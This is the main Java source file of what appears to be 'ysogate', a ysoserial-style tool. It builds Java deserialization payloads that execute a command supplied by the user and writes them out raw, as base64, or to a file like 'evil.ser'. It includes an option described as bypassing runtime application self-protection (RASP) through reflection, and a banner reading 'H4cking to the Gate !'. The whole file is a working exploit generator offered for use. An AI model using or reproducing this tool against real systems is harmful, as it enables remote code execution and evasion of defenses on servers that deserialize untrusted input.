package A.R.ysogate;

import java.io.FileOutputStream;
import java.io.OutputStream;
import java.util.*;

import org.apache.commons.cli.*;
import A.R.ysogate.payloads.ObjectPayload;
import A.R.ysogate.payloads.ObjectPayload.Utils;

import A.R.ysogate.payloads.annotation.Authors;
import A.R.ysogate.payloads.annotation.Dependencies;
import org.apache.commons.codec.binary.Base64OutputStream;

import static A.R.ysogate.Strings.isFromExploit;
import static A.R.ysogate.payloads.config.Config.*;

@SuppressWarnings("rawtypes")
public class GeneratePayload {

    public static CommandLine cmdLine;

    public static Object PAYLOAD = null;

    public static void main(final String[] args) {

        Options options = new Options();
        options.addOption("g", "gadget", true, "Java deserialization gadget");
        options.addOption("p", "parameters", true, "Gadget parameters");
        options.addOption("f", "file", true, "Write Output into FileOutputStream (Specified FileName)");
        options.addOption("b64", "base64", false, "Encode Output into base64");

        options.addOption("i", "inherit", false, "Make payload inherit AbstractTranslet or not (Lower JDK like 1.6 should inherit)");
        options.addOption("xalan", "xalan", false, "Force Using org.apache.xalan instead of jdk");
        options.addOption("o", "obscure", false, "Using reflection to bypass RASP");

        CommandLineParser parser = new DefaultParser();

        if (args.length == 0) {
            printUsage(options);
            System.exit(1);
        }

        try {
            cmdLine = parser.parse(options, args);
        } catch (Exception e) {
            System.out.println("[*] Parameter input error, please use -h for more information");
            printUsage(options);
            System.exit(1);
        }

        if (cmdLine.hasOption("file")) {
            WRITE_FILE = true;
            FILE = cmdLine.getOptionValue("file");
        }

        if (cmdLine.hasOption("base64")) {
            BASE64_ENCODE = true;
        }

        if (cmdLine.hasOption("inherit")) {
            IS_INHERIT_ABSTRACT_TRANSLET = true;
        }

        if (cmdLine.hasOption("xalan")) {
            USING_ORG_APACHE_XALAN = true;
        }

        if (cmdLine.hasOption("obscure")) {
            IS_OBSCURE = true;
        }

        final String payloadType = cmdLine.getOptionValue("gadget");
        final String parameters     = cmdLine.getOptionValue("parameters");

        final Class<? extends ObjectPayload> payloadClass = Utils.getPayloadClass(payloadType);
        if (payloadClass == null) {
            System.err.println("Invalid payload type '" + payloadType + "'");
            printUsage(options);
            System.exit(1);
            return;
        }


        try {
            ObjectPayload payload = payloadClass.newInstance();
            Object        object  = payload.getObject(parameters);

            // 储存生成的 payload
            PAYLOAD = object;
            if (isFromExploit()) {
                return;
            }

            OutputStream out;

            if (WRITE_FILE) {
                out = new FileOutputStream(FILE);
            } else if (BASE64_ENCODE) {
                out = new Base64OutputStream(System.out, true, -1, null);
            }else {
                out = System.out;
            }

            Serializer.serialize(object, out);
            ObjectPayload.Utils.releasePayload(payload, object);

            out.flush();
            out.close();
        } catch (Throwable e) {
            System.err.println("Error while generating or serializing payload");
            e.printStackTrace();
            System.exit(1);
        }
        System.exit(0);
    }

    private static void printUsage(Options options) {

        System.err.println("H4cking to the Gate !");
        System.err.println("[root]#~  Usage: java -jar ysogate-[version]-all.jar -g [payload] -p [command] [options]");
        System.err.println("[root]#~  Available payload types:");

        final List<Class<? extends ObjectPayload>> payloadClasses = new ArrayList<Class<? extends ObjectPayload>>(ObjectPayload.Utils.getPayloadClasses());
        Collections.sort(payloadClasses, new Strings.ToStringComparator()); // alphabetize

        final List<String[]> rows = new LinkedList<String[]>();
        rows.add(new String[]{"Payload", "Authors", "Dependencies"});
        rows.add(new String[]{"-------", "-------", "------------"});
        for (Class<? extends ObjectPayload> payloadClass : payloadClasses) {
            rows.add(new String[]{
                    payloadClass.getSimpleName(),
                    Strings.join(Arrays.asList(Authors.Utils.getAuthors(payloadClass)), ", ", "@", ""),
                    Strings.join(Arrays.asList(Dependencies.Utils.getDependenciesSimple(payloadClass)), ", ", "", "")
            });
        }

        final List<String> lines = Strings.formatTable(rows);

        for (String line : lines) {
            System.err.println("     " + line);
        }

        System.err.println("\r\n");
        HelpFormatter helpFormatter = new HelpFormatter();
        helpFormatter.setWidth(Math.min(200, jline.Terminal.getTerminal().getTerminalWidth()));
        helpFormatter.setOptionComparator(null);
        helpFormatter.printHelp("ysogate-[version]-all.jar", options, true);

        System.err.println("\r\n");
        System.err.println("Recommended Usage: -g [payload] -p '[command]' -o -i -f evil.ser");
        System.err.println("If you want your payload being extremely short，you could just use:");
        System.err.println("java -jar ysogate-[version]-all.jar -g [payload] -p '[command]' -i -f evil.ser");

    }
}
